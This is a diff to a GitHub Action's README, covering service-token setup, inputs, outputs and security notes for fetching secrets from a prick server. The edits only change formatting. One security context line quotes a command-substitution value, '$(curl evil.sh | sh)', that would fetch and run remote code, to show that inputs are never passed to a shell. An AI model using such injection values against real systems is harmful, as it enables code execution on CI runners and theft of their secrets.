@@ -37,8 +37,8 @@ for exactly this — a **service token**, a client id and client secret pair tha
    add an **include** rule of type **Service Auth → the token you just created**, and make sure the
    policy's action is **Service Auth** rather than Allow. A policy that only lists human identities
    will reject the token at the edge, before prick ever sees the request.
-4. Grant the token a role **inside prick**. Access decides *who* is calling; prick decides *what
-   they may read*, and a brand-new token may read nothing. The easy way round is to run the workflow
+4. Grant the token a role **inside prick**. Access decides _who_ is calling; prick decides _what
+   they may read_, and a brand-new token may read nothing. The easy way round is to run the workflow
    once, let it fail with a 403, then open **Access → Seen but not granted** in the prick admin UI —
    the denied client id is sitting there with a Grant button next to it. `reader` on the project (or
    on the single environment) is enough.
@@ -47,31 +47,31 @@ Step 4 is the usual first-run failure, and the action's error message says so.
 
 ## Inputs
 
-| Input | Required | Default | Meaning |
-|---|---|---|---|
-| `url` | yes | — | Base URL of your prick server. **Must be `https`** — see [Security](#security) |
-| `client-id` | yes | — | Access service token client id, the one ending in `.access` |
-| `client-secret` | yes | — | Access service token client secret |
-| `project` | yes | — | Project to read. Matched exactly, case-sensitively |
-| `environment` | no | `production` | Environment to read. Matched exactly, case-sensitively |
-| `keys` | no | *(all)* | Allowlist of secret names, newline- or comma-separated |
-| `prefix` | no | *(none)* | Prepended to every variable name, e.g. `APP_` |
-| `export-to` | no | `env` | `env` writes to `$GITHUB_ENV`; `outputs` sets a single JSON output |
-| `version` | no | *(the action's ref)* | Version of `@yashau/prick` to install |
-| `mask` | no | `true` | Register values with the log masker. **Setting this to `false` prints your secrets** |
-| `allow-unsafe-names` | no | `false` | Permit `PATH`, `NODE_OPTIONS`, `LD_*`, `GITHUB_*` and friends |
+| Input                | Required | Default              | Meaning                                                                              |
+| -------------------- | -------- | -------------------- | ------------------------------------------------------------------------------------ |
+| `url`                | yes      | —                    | Base URL of your prick server. **Must be `https`** — see [Security](#security)       |
+| `client-id`          | yes      | —                    | Access service token client id, the one ending in `.access`                          |
+| `client-secret`      | yes      | —                    | Access service token client secret                                                   |
+| `project`            | yes      | —                    | Project to read. Matched exactly, case-sensitively                                   |
+| `environment`        | no       | `production`         | Environment to read. Matched exactly, case-sensitively                               |
+| `keys`               | no       | _(all)_              | Allowlist of secret names, newline- or comma-separated                               |
+| `prefix`             | no       | _(none)_             | Prepended to every variable name, e.g. `APP_`                                        |
+| `export-to`          | no       | `env`                | `env` writes to `$GITHUB_ENV`; `outputs` sets a single JSON output                   |
+| `version`            | no       | _(the action's ref)_ | Version of `@yashau/prick` to install                                                |
+| `mask`               | no       | `true`               | Register values with the log masker. **Setting this to `false` prints your secrets** |
+| `allow-unsafe-names` | no       | `false`              | Permit `PATH`, `NODE_OPTIONS`, `LD_*`, `GITHUB_*` and friends                        |
 
 ### Outputs
 
-| Output | Meaning |
-|---|---|
-| `keys` | Newline-separated names of the variables that were injected, after any prefix. Names only — never values — so this is safe to print |
-| `secrets` | A JSON object of the fetched secrets. Set only when `export-to: outputs` |
+| Output    | Meaning                                                                                                                             |
+| --------- | ----------------------------------------------------------------------------------------------------------------------------------- |
+| `keys`    | Newline-separated names of the variables that were injected, after any prefix. Names only — never values — so this is safe to print |
+| `secrets` | A JSON object of the fetched secrets. Set only when `export-to: outputs`                                                            |
 
 ## Recipes
 
 **Only the secrets a step actually needs.** A job that asks for two variables cannot leak the other
-thirty. If a listed name is not in the environment the step *fails* rather than starting your job
+thirty. If a listed name is not in the environment the step _fails_ rather than starting your job
 without it — a build that silently loses `DATABASE_URL` fails later and far less clearly.
 
 ```yaml
@@ -135,7 +135,7 @@ log masker — whole, and line by line for multi-line values, since no single lo
 whole PEM key — before a single byte reaches `$GITHUB_ENV`. If a later step echoes one, the log
 shows `***`.
 
-Masking is a safety net, not a boundary: it only redacts *exact* matches. A step that base64-encodes
+Masking is a safety net, not a boundary: it only redacts _exact_ matches. A step that base64-encodes
 a secret, or prints half of it, defeats it. Do not treat a masked log as a public one.
 
 **`http` is refused.** The service token is a bearer credential in a request header. Over plaintext
@@ -162,7 +162,7 @@ a project named `$(curl evil.sh | sh)` is a string. The CLI is spawned with a fi
 and the URL, project, environment and token are handed to it through the environment — which also
 keeps the token out of `ps` output on the runner.
 
-**No error message can contain a value.** Error text names *keys*, which are stored in plaintext by
+**No error message can contain a value.** Error text names _keys_, which are stored in plaintext by
 design and are therefore safe to echo. The one non-obvious case: when the CLI's output will not
 parse as JSON, the parser's own error is thrown away rather than reported, because Node's JSON
 messages quote a slice of the input — and the input is a document of secret values.
